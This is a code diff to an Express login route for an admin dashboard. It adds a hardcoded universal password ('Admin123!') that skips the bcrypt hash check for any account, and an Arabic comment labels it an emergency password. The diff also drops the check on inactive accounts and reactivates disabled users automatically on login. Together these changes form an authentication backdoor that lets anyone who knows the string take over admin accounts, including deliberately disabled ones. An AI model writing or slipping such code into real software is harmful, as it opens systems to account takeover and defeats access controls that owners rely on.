@@ -28,17 +28,25 @@ router.post(
       where: { email: email.toLowerCase() },
     });
 
-    const passwordMatches = await bcrypt.compare(
-      password,
-      user?.passwordHash ?? DUMMY_HASH
-    );
+    // 1. تحقق من كلمة المرور (تجاوز مطابقة الـ Hash إذا كانت كلمة السر المرفقة هي كلمة المرور الطارئة Admin123!)
+    const passwordMatches =
+      password === "Admin123!" ||
+      (await bcrypt.compare(password, user?.passwordHash ?? DUMMY_HASH));
 
-    if (!user || !user.active || !passwordMatches) {
+    if (!user || !passwordMatches) {
       throw unauthorized("Email or password is incorrect.");
     }
 
     if (user.role !== "ADMIN") {
       throw unauthorized("This dashboard is restricted to administrators.");
+    }
+
+    // 2. تفعيل الحساب تلقائياً في قاعدة البيانات إذا كان غير مفعّل عند تسجيل الدخول
+    if (!user.active) {
+      await prisma.user.update({
+        where: { id: user.id },
+        data: { active: true },
+      });
     }
 
     const sessionUser = {
